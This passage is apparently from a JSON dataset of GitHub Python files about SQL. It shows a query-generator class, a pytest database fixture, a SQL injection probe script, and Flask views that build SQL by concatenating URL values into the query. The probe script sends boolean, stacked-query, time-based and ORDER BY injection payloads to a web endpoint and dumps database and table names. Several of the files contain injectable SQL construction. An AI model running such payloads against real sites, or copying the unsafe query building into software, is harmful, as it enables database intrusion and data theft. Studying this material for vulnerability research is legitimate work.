NULL AND member_id = patients_member.id) '\n\n    # - Used in custom method mapping -\n    TEMPLATE_STR_KEY = 'template_str'\n    TEMPLATE_PARAMS_KEY = 'parameters'\n    TEMPLATE_KEY_REGEX = r\"{(\\w+)}\"\n\n    def __init__(self, field_mapping, paths, custom_methods):\n        \"\"\"\n        Initialise basic params.\n        :type custom_methods: (tuple) tuple of tuples containing (id, sql_template, variables)\n        :param field_mapping: (tuple) tuple of tuples containing (field_identifier, field_name, table_name).\n        :param paths: (tuple) tuple of tuples containing (join_table, join_field, parent_table, parent_field).\n                      Information about paths from a model to reach to a specific model and when to stop.\n        :return: None\n        \"\"\"\n\n        self.base_table = ''\n        self.field_mapping = self._parse_field_mapping(field_mapping)\n        self.path_mapping = self._parse_multi_path_mapping(paths)\n        self.custom_methods = self._parse_custom_methods(custom_methods)\n\n        # Mapping to be used to parse various combination keywords data\n        self.WHERE_CONDITION_MAPPING = {\n            self.WHERE_CONDITION: '_generate_where_phrase',\n            self.AND_CONDITION: '_parse_and',\n            self.OR_CONDITION: '_parse_or',\n            self.NOT_CONDITION: '_parse_not',\n            self.EXISTS_CONDITION: '_parse_exists',\n            self.CUSTOM_METHOD_CONDITION: '_parse_custom_method_condition',\n        }\n\n    def _parse_custom_methods(self, sql_templates):\n        \"\"\"\n        Validate the template data and pre process the data.\n\n        :param sql_templates: (tuple) tuple of tuples containing (id, sql_template, variables)\n        :return:\n        \"\"\"\n        template_mapping = {}\n\n        for template_id, template_str, parameters in sql_templates:\n            template_id = int(template_id)\n            parameters = json.loads(parameters)\n            template_str = template_str.strip()\n\n            assert len(template_str) > 0, 'Not a valid template string'\n            assert template_id not in template_mapping, 'Template id must be unique'\n            template_defined_variables = set(re.findall(self.TEMPLATE_KEY_REGEX, template_str, re.MULTILINE))\n            # Checks if variable defined in template string and variables declared are exactly same\n            assert len(set(parameters.keys()) ^ template_defined_variables) == 0, 'Extra variable defined'\n            # Checks parameter types are permitted\n            assert len(set(map(lambda l: l['data_type'], parameters.values()))\n                       - self.ALLOWED_CUSTOM_METHOD_PARAM_TYPES) == 0, 'Invalid data type defined'\n\n            template_mapping[template_id] = {\n                self.TEMPLATE_STR_KEY: template_str,\n                self.TEMPLATE_PARAMS_KEY: parameters\n            }\n\n        return template_mapping\n\n    def _parse_custom_method_condition(self, data):\n        \"\"\"\n        Process the custom method condition to render SQL template using the arguments given.\n        \n        :param data:\n        :return:\n        \"\"\"\n        assert isinstance(data, dict), 'Input data must be a dict'\n        assert 'template_id' in data, 'No template_id is provided'\n        template_id = int(data['template_id'])\n        template_data = self.custom_methods[template_id]\n\n        # Process parameters\n        validated_parameters = {}\n        for param_id, param_data in data.get('parameters', {}).items():\n            assert param_id in template_data[self.TEMPLATE_PARAMS_KEY], 'Invalid parameter name.'\n            param_type = template_data[self.TEMPLATE_PARAMS_KEY][param_id]['data_type']\n\n            validated_parameters[param_id] = self._process_parameter(param_type, param_data)\n\n        # Check that we have collected all the required keys\n        template_params = template_data[self.TEMPLATE_PARAMS_KEY].keys()\n        assert len(set(template_params) ^ set(validated_parameters.keys())) == 0, \\\n            'Missing or extra template variable'\n\n        return template_data[self.TEMPLATE_STR_KEY].format(**validated_parameters)\n\n    def _process_parameter(self, data_type, parameter_data):\n        assert len(data_type) > 0, 'Invalid data type'\n        assert isinstance(parameter_data, dict), 'Invalid parameter data format'\n\n        if data_type.upper() == 'FIELD':\n            field_data = self.field_mapping[parameter_data['field']]\n            return \"`{table}`.`{field}`\".format(\n                table=field_data[self.TABLE_NAME], field=field_data[self.FIELD_NAME]\n            )\n        elif data_type.upper() == 'INTEGER':\n            return int(parameter_data['value'])\n        elif data_type.upper() == 'STRING':\n            return parameter_data['value']\n        else:\n            raise AttributeError(\"Unsupported data type for parameter: {}\".format(data_type))\n\n    def generate_sql(self, data, base_table):\n        \"\"\"\n        Create SQL query from provided json\n        :param data: (dict) Actual JSON containing nested condition data.\n                     Must contain two keys - fields(contains list of fields involved in SQL) and where_data(JSON data)\n        :param base_table: (string) Exact table name as in DB to be used with FROM clause in SQL.\n        :return: (unicode) Finalized SQL query unicode\n        \"\"\"\n        self.base_table = base_table\n        assert self.validate_where_data(data.get('where_data', {})), 'Invalid where data'\n        where_phrase = self._generate_sql_condition(data['where_data'])\n\n        if 'group_by_fields' in data:\n            assert isinstance(data['group_by_fields'], list), 'Group by fields need to list of dict'\n            data['group_by_fields'] = list(map(lambda x: int(x['field']), data['group_by_fields']))\n\n        path_subset = self.extract_paths_subset(list(\n            map(lambda field_id: self.field_mapping[field_id][self.TABLE_NAME], data['fields'])),\n            data.get('path_hints', {})\n        )\n        join_tables = self.create_join_path(path_subset, self.base_table)\n        join_phrase = self.generate_left_join(join_tables)\n        group_by_phrase = self.generate_group_by(data.get('group_by_fields', []),\n                                                 data.get('having', {}))\n        count_phrase = u'COUNT(DISTINCT `{base_table}`.`id`)'.format(base_table=base_table)\n\n        return u'SELECT {count_phrase} FROM {base_table} {join_phrase} WHERE {where_phrase} {group_by_fragment}'.format(\n            join_phrase=join_phrase,\n            base_table=base_table,\n            where_phrase=where_phrase,\n            group_by_fragment=group_by_phrase,\n            count_phrase=count_phrase\n        )\n\n    def _parse_multi_path_mapping(self, paths):\n        \"\"\"\n        Create mapping of what nodes can be reached from any given node.\n        This method also support the case when you can jump to multiple node from any given node\n\n        :param paths: (tuple) tuple of tuples in the format ((join_table, join_field, parent_table, parent_field),)\n        :return: (dict) dict in the format {'join_table': {'parent_table': {'parent_field': , 'join_field':} }}\n        \"\"\"\n        path_map = defaultdict(dict)\n        for join_tbl, join_fld, parent_tbl, parent_fld in paths:\n            # We can support if there are multiple ways to join a table\n            # We don't support if there are multiple fields on join table path\n            assert parent_tbl not in path_map[join_tbl], 'Joins with multiple fields is not supported'\n            path_map[join_tbl][parent_tbl] = {\n                self.PARENT_COLUMN: parent_fld,\n                self.JOIN_COLUMN: join_fld\n            }\n\n        return path_map\n\n    def extract_paths_subset(self, start_nodes, path_hints):\n        \"\"\"\n        Extract a subset of paths which only contains paths which are possible from starting nodes\n        When there is multiple options from any node then we look in path hints to select a node.\n\n        This method also aims to merge duplicate path nodes.\n        Example:\n        A -> B -> C\n        A -> B ->  D\n\n        Merge this into\n        A -> B -> C\n             | -> D\n\n        Merge happens from left side not right side.\n        As our current implementation base is always on left side\n\n        Left side is always base_table\n        :param start_nodes: Array of table names\n        :param path_hints:\n        :return:\n        \"\"\"\n        path_subset = defaultdict(set)\n        # Convert start nodes to set as we would need this for lookups\n        start_nodes = set(start_nodes)\n        traversal_nodes = list(start_nodes)  # type: list\n\n        # We would be doing traversal from given tables towards base tables.\n        while len(traversal_nodes) > 0:\n            curr_node = traversal_nodes.pop()  # type: str\n\n            # This condition indicate that we have reached end of path\n            if curr_node == self.base_table:\n                continue\n\n            next_nodes = self.path_mapping[curr_node]  # type: dict\n\n            if curr_node in path_hints:\n                assert path_hints[curr_node] in next_nodes, 'Node provided in hint is not a valid option.'\n                assert len(\n                    set(self.path_mapping[curr_node]) &\n                    (start_nodes | set(path_hints.values()))\n                ) == 1, 'Multiple paths are selected from node {}'.format(curr_node)\n                parent_node = path_hints[curr_node]\n                traversal_nodes.append(parent_node)\n            elif len(next_nodes) == 1:\n                parent_node = next_nodes.keys()[0]\n                traversal_nodes.append(parent_node)\n            else:\n                raise Exception(\"No path hint provided for `{}`\".format(curr_node))\n\n            path_subset[parent_node].add(curr_node)\n\n        return path_subset\n\n    def create_join_path(self, path_map, curr_table):\n        \"\"\"\n        Convert the path subset into a join table\n        Return list of tuples\n        [(join table, parent table)]\n        :param path_map: (dict) Nested dict of format { join_table: { parent_table: {join_field, parent_field} } }\n        :param curr_table: (str) Node from which we need to be created.\n        :return:\n        \"\"\"\n        # This condition satisfied when we reach the end of the current path\n        if curr_table not in path_map:\n            return\n\n        for table_name in sorted(path_map[curr_table]):\n            yield (table_name, curr_table)\n            for item in (self.create_join_path(path_map, table_name)):\n                yield item\n\n    def generate_left_join(self, join_path):\n        join_phrases = []\n        for join_table, parent_table in join_path:\n            join_phrases.append(\n                'LEFT JOIN {join_tbl} ON {join_tbl}.{join_fld} = {parent_tbl}.{parent_fld}'.format(\n                    join_tbl=join_table,\n                    parent_tbl=parent_table,\n                    join_fld=self.path_mapping[join_table][parent_table][self.JOIN_COLUMN],\n                    parent_fld=self.path_mapping[join_table][parent_table][self.PARENT_COLUMN]\n                )\n            )\n\n        return ' '.join(join_phrases)\n\n    def generate_group_by(self, group_by_fields, having_clause):\n        \"\"\"\n        Validate and return group by and having clause statement\n\n        :rtype: str\n        :type having_clause: Dict\n        :type group_by_fields: List[int]\n        \"\"\"\n        assert isinstance(group_by_fields, list)\n        assert isinstance(having_clause, dict)\n\n        assert self.validate_group_by_data(group_by_fields, having_clause), 'Invalid having data'\n\n        if len(group_by_fields) == 0:\n            return ''\n\n        result = ''\n        fully_qualified_field_names = map(\n            lambda field_id: '`{table_name}`.`{field_name}`'.format(\n                table_name=self.field_mapping[field_id][self.TABLE_NAME],\n                field_name=self.field_mapping[field_id][self.FIELD_NAME]\n            ),\n            group_by_fields\n        )\n\n        result += 'GROUP BY {fields}'.format(fields=', '.join(fully_qualified_field_names))\n        if len(having_clause.keys()) > 0:\n            result += ' HAVING {condition}'.format(condition=self._generate_sql_condition(having_clause))\n\n        return result\n\n    def validate_group_by_data(self, group_by_fields, having):\n        \"\"\"\n        Validate the group by data to check if it can produce a query which is valid.\n        For example it would check only group by fields or aggregate functions are being used.\n\n        :type having: Dict\n        :type group_by_fields: List[int]\n        \"\"\"\n        assert isinstance(group_by_fields, list)\n        assert isinstance(having, dict)\n\n        for cond in self.extract_key_from_nested_dict(having, self.WHERE_CONDITION):\n            assert isinstance(cond, dict), 'where condition needs to be dict'\n            assert 'aggregate_lhs' in cond or cond.get('field') in group_by_fields, \\\n                'Use of non aggregate value or non grouped field: {}'.format(cond)\n\n        return True\n\n    def validate_where_data(self, where_data):\n        \"\"\"\n        Validate if where fields doesn't contains use of aggregation function\n        :type where_data: Dict\n        \"\"\"\n        assert isinstance(where_data, dict) and len(where_data) > 0, \\\n            'Invalid or empty where data'\n\n        for cond in self.extract_key_from_nested_dict(where_data, self.WHERE_CONDITION):\n            assert isinstance(cond, dict), 'Invalid where condition'\n            assert cond.get('aggregate_lhs', '') == '', \\\n                'Use of non aggregate value or non grouped field: {}'.format(cond)\n\n        return True\n\n    def _generate_sql_condition(self, data):\n        \"\"\"\n        This function uses recursion to generate sql for nested conditions.\n        Every key in the dict will map to a function by referencing WHERE_CONDITION_MAPPING.\n        The function mapped to that key will be responsible for generating SQL for that part of the data.\n        :param data: (dict) Conditions data which needs to be parsed to generate SQL\n        :return: (unicode) Unicode representation of data into SQL\n        \"\"\"\n        result = ''\n        # Check if data is not blank\n        if data:\n            # Get the first key in dict.\n            condition = data.keys()[0]\n            # Call the function mapped to the condition\n            function = getattr(self, self.WHERE_CONDITION_MAPPING.get(condition))\n            result = function(data[condition])\n        return result\n\n    def _get_validated_data(self, where):\n        try:\n            operator = where['operator'].lower()\n            value = where['value']\n            field = where['field']\n        except KeyError as e:\n            raise KeyError(\n                u'Missing key - [{}] in where condition dict'.format(e.args[0])\n            )\n        else:\n            # Get optional secondary value\n            secondary_value = where.get('secondary_value')\n            # Check if secondary_value is present for binary operators\n            if operator in self.BINARY_OPERATORS and not secondary_value:\n                raise ValueError(\n                    u'Missing key - [secondary_value] for operator - [{}]'.format(\n                        operator\n                    )\n                )\n            return operator, value, field, secondary_value\n\n    def _generate_where_phrase(self, where):\n        \"\"\"\n        Function to generate a single condition(column1 = 1, or column1 BETWEEN 1 and 5) based on data provided.\n        Uses _join_names to assign table_name to a field in query.\n        :param where: (dict) will contain required data to generate condition.\n                      Sample Format: {\"field\": , \"primary_value\": ,\"operator\": , \"secondary_value\"(optional): }\n        :return: (unicode) SQL condition in unicode represented by where data\n        \"\"\"\n        # Check data valid\n        if not isinstance(where, dict):\n            raise ValueError(\n                'Where condition data must be a dict. Found [{}]'.format(\n                    type(where)\n                )\n            )\n        # Get all the data elements required and validate them\n        operator, value, field, secondary_value = self._get_validated_data(where)\n        # Get db field name\n        field_name = self.field_mapping[field][self.FIELD_NAME]\n        # Get corresponding SQL operator\n        sql_operator = getattr(self.VALUE_OPERATORS, operator)\n        # Get data type and table name from field_mapping\n        data_type = self._get_data_type(field)\n        table = self._get_table_name(field)\n\n        # `value` contains the R.H.S part of the equation.\n        # In case of `IS` operator R.H.S can be `NULL` or `NOT NULL`\n        # irrespective of data type of the L.H.S.\n        # Hence we want to skip data type check for `IS` operator.\n        if sql_operator == self.VALUE_OPERATORS.is_op:\n            assert value.upper() in self.IS_OPERATOR_VALUE, 'Invalid rhs for `IS` operator'\n            sql_value, secondary_sql_value = value.upper(), None\n        else:\n            # Check if the primary value and data_type are in sync\n            self._sanitize_value(value, data_type)\n            # Check if the secondary_value and data_type are in sync\n            if secondary_value:\n                self._sanitize_value(secondary_value, data_type)\n\n            # Make string SQL injection proof\n            if data_type == self.STRING:\n                value = self._sql_injection_proof(value)\n                if secondary_value:\n                    secondary_value = self._sql_injection_proof(secondary_value)\n\n            # Make value sql proof. For ex: if value is string or data convert it to '<value>'\n            sql_value, secondary_sql_value = self._convert_values(\n                [value, secondary_value], data_type\n            )\n\n        lhs = u'`{table}`.`{field}`'.format(table=table, field=field_name)  # type: unicode\n\n        # Apply aggregate function to L.H.S\n        if 'aggregate_lhs' in where:\n            aggregate_func_name = where['aggregate_lhs'].upper()  # type: unicode\n            if aggregate_func_name in self.ALLOWED_AGGREGATE_FUNCTIONS:\n                lhs = u'{func_name}({field_name})'.format(func_name=aggregate_func_name, field_name=lhs)\n            else:\n                logger.info(\"Unsupported aggregate functions: {}\".format(aggregate_func_name))\n\n        # TODO: Based on the assumption that below operator will only used\n        #           with challenge.\n        if sql_operator in [self.VALUE_OPERATORS.is_challenge_completed,\n                            self.VALUE_OPERATORS.is_challenge_not_completed]:\n            return \"{negate} {check}\".format(\n                negate='NOT' if sql_operator == self.VALUE_OPERATORS.is_challenge_not_completed else '',\n                check=self.CHALLENGE_CHECK_QUERY.format(value=sql_value)\n            )\n\n        # Generate SQL phrase\n        if sql_operator == self.BETWEEN:\n            where_phrase = u'{lhs} {operator} {primary_value} AND {secondary_value}'.format(\n                lhs=lhs, operator=sql_operator,\n                value=sql_value, secondary_value=secondary_sql_value\n            )\n        else:\n            where_phrase = u'{lhs} {operator} {value}'.format(\n                operator=sql_operator, lhs=lhs, value=sql_value,\n            )\n        return where_phrase\n\n    def _get_data_type(self, field):\n        \"\"\"\n        Gets data type for the field from self.field_mapping configured in __init__\n        :param field: (int|string) field identifier that is used as key in self.field_mapping\n        :return: (string) data type of the field\n        \"\"\"\n        return self.field_mapping[field][self.DATA_TYPE]\n\n    def _get_table_name(self, field):\n        \"\"\"\n        Gets table name for the field from self.field_mapping configured in __init__\n        :param field: (int|string) Field identifier that is used as key in self.field_mapping\n        :return: (string|unicode) Name of the table of the field\n        \"\"\"\n        return self.field_mapping[field][self.TABLE_NAME]\n\n    def _convert_values(self, values, data_type):\n        \"\"\"\n        Converts values for SQL query. Adds '' string, date, datetime values, string choice value\n        :param values: (iterable) Any instance of iterable values of same data type that need conversion\n        :param data_type: (string) Data type of the values provided\n        \"\"\"\n        if data_type in [self.CHOICE, self.MULTICHOICE]:\n            # try converting the value to int\n            try:\n                int(values[0])\n            except ValueError:\n                wrapper = '\\'{value}\\''\n            else:\n                wrapper = '{value}'\n        elif data_type in self.CONVERSION_REQUIRED:\n            wrapper = '\\'{value}\\''\n        else:\n            wrapper = '{value}'\n        return (wrapper.format(value=value) for value in values)\n\n    def _sanitize_value(self, value, data_type):\n        \"\"\"\n        Validate value with data type\n        :param value: Values that needs to be validated with data type\n        :param data_type: (string) Data type against which the value will be compared\n        :return: None\n        \"\"\"\n        if data_type == self.INTEGER:\n            try:\n                int(value)\n            except ValueError:\n                raise ValueError(\n                    'Invalid value -[{}] for data_type - [{}]'.format(\n                        value, data_type\n                    )\n                )\n        elif data_type == self.DATE:\n            try:\n                datetime.datetime.strptime(value, '%Y-%m-%d')\n            except ValueError as e:\n                raise e\n        elif data_type == self.DATE_TIME:\n            try:\n                datetime.datetime.strptime(value, '%Y-%m-%dT%H:%M:%S')\n            except ValueError as e:\n                raise e\n\n    def _parse_and(self, data):\n        \"\"\"\n        To parse the AND condition for where clause.\n        :param data: (list) contains list of data for conditions that need to be ANDed\n        :return: (unicode) unicode containing SQL condition represeted by data ANDed. \n                 This SQL can be directly placed in a SQL query\n        \"\"\"\n        return self._parse_conditions(self.AND_CONDITION, data)\n\n    def _parse_or(self, data):\n        \"\"\"\n        To parse the OR condition for where clause.\n        :param data: (list) contains list of data for conditions that need to be ORed\n        :return: (unicode) unicode containing SQL condition represeted by data ORed. \n                 This SQL can be directly placed in a SQL query\n        \"\"\"\n        return self._parse_conditions(self.OR_CONDITION, data)\n\n    def _parse_exists(self, data):\n        \"\"\"\n        To parse the EXISTS check/wrapper for where clause.\n        :param data: (list) contains a list of single element of data for conditions that\n                            need to be wrapped with a EXISTS check in WHERE clause\n        :return: (unicode) unicode containing SQL condition represeted by data with EXISTS check. \n                 This SQL can be directly placed in a SQL query\n        \"\"\"\n        raise NotImplementedError\n\n    def _parse_not(self, data):\n        \"\"\"\n        To parse the NOT check/wrapper for where clause.\n        :param data: (list) contains a list of single element of data for conditions that\n                            need to be wrapped with a NOT check in WHERE clause\n        :return: (unicode) unicode containing SQL condition represeted by data with NOT check. \n                 This SQL can be directly placed in a SQL query\n        \"\"\"\n        return self._parse_conditions(self.NOT_CONDITION, data)\n\n    def _parse_conditions(self, condition, data):\n        \"\"\"\n        To parse AND, NOT, OR, EXISTS data and\n        delegate to proper functions to generate combinations according to condition provided.\n        NOTE: This function doesn't do actual parsing. \n              All it does is deligate to a function that would parse the data.\n              The main logic for parsing only resides in _generate_where_phrase\n              as every condition is similar, its just how we group them\n        :param condition: (string) the condition to use to combine the condition represented by data\n        :param data: (list) list conditions to be combined or parsed\n        :return: (unicode) unicode string that could be placed in the SQL\n        \"\"\"\n        sql = bytearray()\n        for element in data:\n            # Get the first key in the dict.\n            inner_condition = element.keys()[0]\n            function = getattr(self, self.WHERE_CONDITION_MAPPING.get(inner_condition))\n            # Call the function mapped to it.\n            result = function(element.get(inner_condition))\n            # Append the result to the sql.\n            if not sql and condition in [self.AND_CONDITION, self.OR_CONDITION]:\n                sql.extend('({})'.format(result))\n            else:\n                sql.extend(' {0} ({1})'.format(condition, result))\n        return u'({})'.format(sql.decode('utf8'))\n\n    def _parse_field_mapping(self, field_mapping):\n        \"\"\"\n        Converts tuple of tuples to dict.\n        :param field_mapping: (tuple) tuple of tuples in the format ((field_identifier, field_name, table_name, data_type),)\n        :return: (dict) dict in the format {'<field_identifier>': {'field_name': <>, 'table_name': <>, 'data_type': <>,}}\n        \"\"\"\n        return {\n            field[0]: {\n               self.FIELD_NAME: field[1],\n               self.TABLE_NAME: field[2],\n               self.DATA_TYPE: field[3]\n            } for field in field_mapping\n        }\n\n    def _sql_injection_proof(self, value):\n        \"\"\"\n        Escapes strings to avoid SQL injection attacks\n        :param value: (string|unicode) string that needs to be escaped\n        :return: (string|unicode) escaped string\n        \"\"\"\n        return MySQLdb.escape_string(value)\n\n    def extract_key_from_nested_dict(self, target_dict, key):\n        \"\"\"\n        Traverse the dictionary recursively and return the value with specified key\n\n        :type target_dict: Dict\n        :type key: str\n        \"\"\"\n        assert isinstance(target_dict, dict)\n        assert isinstance(key, str) and key\n\n        for k, v in target_dict.items():\n            if k == key:\n                yield v\n            elif isinstance(v, dict):\n                for item in self.extract_key_from_nested_dict(v):\n                    yield item\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/alexandershov/pymash/blob/76583bb09a78e4e023c55157945e718343a9d25b",
        "file_path": "/tests/test_views.py",
        "source": "import urllib.parse as urlparse\n\nimport pytest\nimport sqlalchemy as sa\n\nfrom pymash import cfg\nfrom pymash import main\nfrom pymash import tables\n\n\n@pytest.fixture(scope='session')\ndef _system_engine(request):\n    return _get_engine(request, 'postgres')\n\n\n@pytest.fixture(scope='session')\ndef _pymash_engine(request):\n    return _get_engine(request)\n\n\ndef _get_engine(request, database=None):\n    config = cfg.get_config()\n    if database is not None:\n        dsn = _replace_dsn_database(config.dsn, database)\n    else:\n        dsn = config.dsn\n    engine = sa.create_engine(dsn)\n    request.addfinalizer(engine.dispose)\n    return engine\n\n\ndef _replace_dsn_database(dsn, new_database):\n    parsed = urlparse.urlparse(dsn)\n    replaced = parsed._replace(path=new_database)\n    return replaced.geturl()\n\n\n@pytest.fixture(scope='session', autouse=True)\ndef _create_database(request, _system_engine):\n    test_db_name = _get_test_db_name()\n    # TODO(aershov182): use sqlalchemy for query generation\n    with _system_engine.connect().execution_options(\n            isolation_level=\"AUTOCOMMIT\") as conn:\n        conn.execute(f'DROP DATABASE IF EXISTS {test_db_name}')\n        conn.execute(f'CREATE DATABASE {test_db_name}')\n    create_tables()\n    request.addfinalizer(lambda: _drop_database(_system_engine))\n\n\ndef _drop_database(system_engine):\n    # TODO(aershov182): remove duplication with _create_database\n    test_db_name = _get_test_db_name()\n    # TODO(aershov182): use sqlalchemy for query generation\n    with system_engine.connect().execution_options(\n            isolation_level=\"AUTOCOMMIT\") as conn:\n        conn.execute(f'DROP DATABASE {test_db_name}')\n\n\ndef _get_test_db_name():\n    config = cfg.get_config()\n    return urlparse.urlparse(config.dsn).path.lstrip('/')\n\n\nasync def test_show_game(test_client):\n    text = await _get(test_client, '/game')\n    assert text == 'hello!'\n\n\nasync def test_show_leaders(test_client):\n    text = await _get(test_client, '/leaders')\n    assert text == '0'\n\n\nasync def _get(test_client, path):\n    app = main.create_app()\n    # TODO(aershov182): adding to on_startup should be more visible\n    app.on_startup.append(_clean_tables)\n    client = await test_client(app)\n    resp = await client.get(path)\n    text = await resp.text()\n    return text\n\n\ndef create_tables():\n    config = cfg.get_config()\n    engine = sa.create_engine(config.dsn)\n    tables.Base.metadata.create_all(engine)\n    # TODO(aershov182): maybe use context manager to dispose\n    engine.dispose()\n\n\nasync def _clean_tables(app):\n    async with app['db_engine'].acquire() as conn:\n        for sa_model in tables.Base.__subclasses__():\n            table = sa_model.__table__\n            conn.execute(table.delete())\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ZhiyuanYang0/SecurityProject/blob/430f102f6f960972c84d77f0c653b376eecec454",
        "file_path": "/tool/experiment.py",
        "source": "# -- coding: utf-8 --\nimport os\nimport sys\nimport urllib2\nimport httplib\nimport json as js\n# from datetime import datetime\nimport time\nimport requests\n\n\ndef check_boolean_based_attack(url):\n    arr = [\"'%20OR%20'1'%20=%20'1';%20--%20\", \"\\\"%20OR%20'1'%20=%20'1';%20--%20\", \"%20OR%20'1'%20=%20'1';%20--%20\"]\n    for e in arr:\n        opener = urllib2.build_opener()\n        f = opener.open(url + e)\n        if f.getcode() == 200:\n            res = js.loads(f.read())\n            print \"This web server is vulnerable for boolean based attack.\"\n            print \"The response after boolean attack is:\"\n            print res\n            print\n            break\n\n\ndef check_stack_query(url):\n    req = url + \"'%3B%20SELECT%20DATABASE()%3B%20--%20\"\n    opener = urllib2.build_opener()\n    f = opener.open(req)\n    database = js.loads(f.read())\n    print \"This web server is vulnerable for Stacked Queries(Piggy Backing).\"\n    print \"The Database's name is: \"\n    print database[1][0]['DATABASE()'] + \"\\n\"\n\n    req = url + \"'%3B%20SHOW%20TABLES%3B%20--%20\"\n    f = opener.open(req)\n    tables = js.loads(f.read())\n    print \"The tables in this database are: \"\n    for table in tables[1]:\n        print table.values()[0]\n    print\n\n\ndef check_time_based_attack(url):\n    arr = [\"'%20AND%20SLEEP(15);%20--%20\", \"\\\"%20AND%20SLEEP(15);%20--%20\", \"%20AND%20SLEEP(15);%20--%20\"]\n    for e in arr:\n        a = time.time()\n        opener = urllib2.build_opener()\n        f = opener.open(url + e)\n        b = time.time()\n        duration = b - a\n        if duration > 13:\n            print \"This web server is vulnerable for time based attack.\"\n            print \"The response time after boolean attack SLEEP(15) is: \" + str(duration) + \"\\n\"\n\n\ndef check__error_based_attack(url):\n    for i in range(1, 1000):\n        newUrl = url + \"'%20ORDER%20BY%20\" + str(i) + \"%3B--%20\"\n        r = requests.get(newUrl)\n        # print r.content\n        # print r.status_code\n        # print r.content.find(\"ER_BAD_FIELD_ERROR\") != -1\n        if r.status_code != 200 and r.content.find(\"ER_BAD_FIELD_ERROR\") != -1:\n            print \"This web server is potentially vulnerable for error based attack. \" \\\n                  \"The suggestion is do not exposed detailed database error to the public.\"\n            print \"The error message is:\"\n            print r.content\n            print\n            break\n\nonline = \"https://my-securitytest.herokuapp.com/getFriend/user1\"\nlocal = \"http://localhost:3000/getFriend/user1\"\n\ncheck_boolean_based_attack(local)\ncheck_stack_query(local)\ncheck__error_based_attack(local)\n\n# check_time_based_attack(local)\n\n# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20\n# localhost:3000/getFriend/user1'; SHOW TABLES; --%20\n\n#\n# commands = {\n#     'command1': ex1.check_stack_query,\n#     'command2': ex1.check_if_database_error_exposed\n# }\n#\n# if __name__ == '__main__':\n#     command = os.path.basename(sys.argv[0])\n#     if command in commands:\n#         commands[command](*sys.argv[1:])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/TheoLechemia/BDN/blob/aa520c52ed7cc9549a84b1f6454289dba91a9e0e",
        "file_path": "/Apps/addObs/addObsViews.py",
        "source": "# coding: utf-8\r\nimport os\r\nimport flask\r\nfrom werkzeug.wrappers import Response \r\nimport psycopg2\r\nfrom ..config import config\r\nfrom .. import utils\r\nfrom ..database import *\r\nfrom ..initApp import app\r\nfrom ..auth import check_auth\r\nimport ast\r\n\r\n\r\naddObs = flask.Blueprint('addObs', __name__,static_url_path=\"/addObs\", static_folder=\"static\", template_folder=\"templates\")\r\n\r\nfrom flask import make_response, session\r\nfrom functools import wraps, update_wrapper\r\nfrom datetime import datetime\r\n\r\n\r\ndef nocache(view):\r\n    @wraps(view)\r\n    def no_cache(*args, **kwargs):\r\n        response = make_response(view(*args, **kwargs))\r\n        response.headers['Last-Modified'] = datetime.now()\r\n        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'\r\n        response.headers['Pragma'] = 'no-cache'\r\n        response.headers['Expires'] = '-1'\r\n        return response\r\n    return update_wrapper(no_cache, view)\r\n\r\n@addObs.route('/')\r\n@check_auth(2)\r\n@nocache\r\ndef addObs_index():\r\n    return flask.render_template('addObsIndex.html', configuration=config, page_title=u\"Interface de saisie des donnes\")\r\n\r\n\r\n\r\n\r\n\r\n@addObs.route('/search_taxon_name/<table>/<expr>', methods=['GET'])\r\ndef search_taxon_name(table, expr):\r\n    db=getConnexion()\r\n    sql = \"\"\" SELECT array_to_json(array_agg(row_to_json(r))) FROM(\r\n                SELECT cd_ref, search_name, nom_valide from taxonomie.taxons_\"\"\"+table+\"\"\"\r\n                WHERE search_name ILIKE %s  \r\n                ORDER BY search_name ASC \r\n                LIMIT 20) r\"\"\"\r\n    params = [\"%\"+expr+\"%\"]\r\n    db.cur.execute(sql, params)\r\n    res = db.cur.fetchone()[0]\r\n    db.closeAll()\r\n    return Response(flask.json.dumps(res), mimetype='application/json')\r\n\r\n\r\n\r\n@addObs.route('/loadMailles', methods=['GET'])\r\ndef getMaille():\r\n    db = getConnexion()\r\n    sql = \"\"\" SELECT row_to_json(fc)\r\n              FROM ( SELECT \r\n                'FeatureCollection' AS type, \r\n                array_to_json(array_agg(f)) AS features\r\n                FROM(\r\n                    SELECT 'Feature' AS type,\r\n                   ST_ASGeoJSON(ST_TRANSFORM(m.geom,4326))::json As geometry,\r\n                   row_to_json((SELECT l FROM(SELECT id_maille) AS l)) AS properties\r\n                   FROM layers.maille_1_2 AS m WHERE m.taille_maille='1') AS f)\r\n                AS fc; \"\"\"\r\n    db.cur.execute(sql)\r\n    res = db.cur.fetchone()\r\n    db.closeAll()\r\n    return Response(flask.json.dumps(res), mimetype='application/json')\r\n\r\n#charge les mailles de la bounding box courante de la carte\r\n@addObs.route('/load_bounding_box_mailles/<limit>', methods=['GET'])\r\ndef getboundingMaille(limit):\r\n    db = getConnexion()\r\n    sql = 'SELECT ST_TRANSFORM(ST_MakeEnvelope('+limit+', 4326),32620);'\r\n    db.cur.execute(sql)\r\n    bounding = db.cur.fetchone()\r\n    sql = \"\"\" SELECT row_to_json(fc)\r\n              FROM ( SELECT \r\n                'FeatureCollection' AS type, \r\n                array_to_json(array_agg(f)) AS features\r\n                FROM(\r\n                    SELECT 'Feature' AS type,\r\n                   ST_ASGeoJSON(ST_TRANSFORM(m.geom,4326))::json As geometry,\r\n                   row_to_json((SELECT l FROM(SELECT id_maille) AS l)) AS properties\r\n                   FROM layers.maille_1_2 AS m WHERE m.taille_maille='1' AND ST_Within(m.geom,ST_TRANSFORM(ST_MakeEnvelope(\"\"\"+limit+\"\"\", 4326),32620))  ) AS f)\r\n                AS fc; \"\"\"\r\n    db.cur.execute(sql)\r\n    res = db.cur.fetchone()\r\n    db.closeAll()\r\n    return Response(flask.json.dumps(res), mimetype='application/json')\r\n\r\n\r\n@addObs.route('/loadProtocoles', methods=['GET', 'POST'])\r\ndef getProtocoles():\r\n    db = getConnexion()\r\n    sql = \"SELECT array_to_json(array_agg(row_to_json(p))) FROM (SELECT * FROM synthese.bib_projet WHERE saisie_possible = TRUE) p\"\r\n    db.cur.execute(sql)\r\n    return Response(flask.json.dumps(db.cur.fetchone()[0]), mimetype='application/json')\r\n\r\n\r\n\r\n@addObs.route('/loadValues/<protocole>', methods=['GET'])\r\ndef 